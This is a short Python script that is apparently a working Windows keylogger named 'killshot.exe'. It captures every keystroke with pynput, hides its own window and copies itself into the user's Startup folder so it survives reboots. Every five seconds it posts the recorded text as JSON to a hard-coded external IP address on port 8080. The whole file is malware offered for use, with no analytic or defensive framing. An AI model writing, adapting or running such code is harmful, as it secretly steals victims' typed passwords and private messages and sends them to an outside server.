from pynput import keyboard
import requests
import json
import threading
import socket
import os
import subprocess
import getpass as gt
import win32gui, win32con
from pathlib import Path
import getpass


text = ""

ip_address = "18.181.250.56"
port_number = "8080"
time_interval = 5

def send_post_req():
    try:
       
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")


def on_press(key):
    global text


    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
       
        text += str(key).strip("'")




with keyboard.Listener(on_press=on_press) as listener:
    
    the_program_to_hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)


# get the current working directory
    

    # print(os.system('whoami') )
    # print(os.getcwd() )
    src=os.getcwd()+"\killshot.exe"
    print(getpass.getuser())
    drc=r"C:\Users\lenovo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\killshot.exe"
    os.rename(src,drc)
    send_post_req()
    listener.join()


